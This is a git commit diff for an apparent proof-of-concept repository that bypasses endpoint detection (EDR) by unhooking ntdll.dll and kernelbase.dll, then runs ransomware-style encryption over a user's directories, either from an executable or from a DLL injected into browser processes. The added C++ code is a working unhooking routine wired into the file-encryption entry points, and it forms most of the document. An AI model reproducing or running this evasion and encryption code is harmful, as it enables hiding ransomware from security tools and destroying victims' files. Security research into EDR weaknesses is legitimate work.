54d1dd89e9712024578246c4fb33f925cc40b42a
Skyf0l <tom.rorato@epitech.eu>
2022-07-20 16:36:54 +0200

    Add files via upload

--- README.md
+++ README.md
@@ -1,11 +1,11 @@
 # POC-EDR-unhook-bypass
 
-**Warning:** Directories `C:\Users\john.doe\` and `D:\Users\john.doe\` will be encrypted.
+**Warning:** Directories `C:\Users\john.doe\` and `C:\Users\Public\john.doe\` will be encrypted.
 
 - 1/ Unhook `ntdll.dll` and `kernelbase.dll` to allow syscalls (blocked by EDR)
 - 2/ Inject `ransomtest.dll` in other process (firefox and chrome works)
   The EDR seems to monitor the process but not injected dlls (`remove` and `unlink` syscalls are blocked by EDR by executing `ransomtest.exe` directly, even with `ntdll.dll` unhooked)
-- 3/ Say goodbye to all John Doe files (`C:\Users\john.doe\` and `D:\Users\john.doe\` directories)
+- 3/ Say goodbye to all John Doe files (`C:\Users\john.doe\` and `C:\Users\Public\john.doe\` directories)
 
 I don't know exactly why it worked, but it did and it's a PoC.
 
--- ransomtest.cpp
+++ ransomtest.cpp
@@ -13,9 +13,42 @@
 using namespace std;
 
 static const string ENC_EXTENSION = "enc";
+
 static char ENC_KEY[] = "D34dB33F";
 
 #define BUFFER_SIZE 1024
+
+// From: https://inf0sec.fr/article-20.php
+int unHook(const string &name)
+{
+    cout << "Unhooking " << name << endl;
+    HANDLE process = GetCurrentProcess();
+    MODULEINFO mi = {};
+    HMODULE ntdllModule = GetModuleHandleA(name.c_str());
+    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
+    HANDLE ntdllFile = CreateFileA(("C:\\windows\\system32\\" + name).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
+    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
+    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
+    {
+        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+        if (!strcmp((char *)hookedSectionHeader->Name, (char *)".text"))
+        {
+            DWORD oldProtection = 0;
+            BOOL isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+        }
+    }
+    CloseHandle(process);
+    CloseHandle(ntdllFile);
+    CloseHandle(ntdllMapping);
+    FreeLibrary(ntdllModule);
+    return 0;
+}
 
 void encrypt_file(const string &path, const string &encrypted_path)
 {
@@ -44,6 +77,13 @@ void encrypt_file(const string &path, const string &encrypted_path)
 
 void encrypt_dir(const string &dir)
 {
+    if (!std::filesystem::exists(dir))
+    {
+        cout << "Directory does not exist: " << dir << endl;
+        return;
+    }
+    cout << "Encrypting directory: " << dir << endl;
+
     for (auto &p : filesystem::recursive_directory_iterator(dir))
     {
         if (p.is_regular_file())
@@ -54,7 +94,6 @@ void encrypt_dir(const string &dir)
             {
                 string path = p.path().string();
                 string encrypted_path = path + "." + ENC_EXTENSION;
-                cout << "Encrypting " << path << endl;
                 encrypt_file(path, encrypted_path);
             }
         }
@@ -64,9 +103,16 @@ void encrypt_dir(const string &dir)
 // Run from exe
 int main(int argc, char *argv[])
 {
+    Sleep(1000);
+    unHook("ntdll.dll");
+    Sleep(1000);
+    unHook("kernelbase.dll");
+    Sleep(1000);
+
+    encrypt_dir("C:\\Users\\Public\\john.doe");
     encrypt_dir("C:\\Users\\john.doe");
-    encrypt_dir("D:\\Users\\john.doe");
     cout << "John Doe is now encrypted!" << endl;
+    cin.get();
 }
 
 // Run from dll
@@ -77,9 +123,14 @@ void msgBox()
 
 void run()
 {
-    Sleep(5000);
+    Sleep(1000);
+    unHook("ntdll.dll");
+    Sleep(1000);
+    unHook("kernelbase.dll");
+    Sleep(1000);
+
+    encrypt_dir("C:\\Users\\Public\\john.doe");
     encrypt_dir("C:\\Users\\john.doe");
-    encrypt_dir("D:\\Users\\john.doe");
     MessageBox(0, "John Doe is now encrypted!", "Encryption", MB_ICONINFORMATION);
 }
 
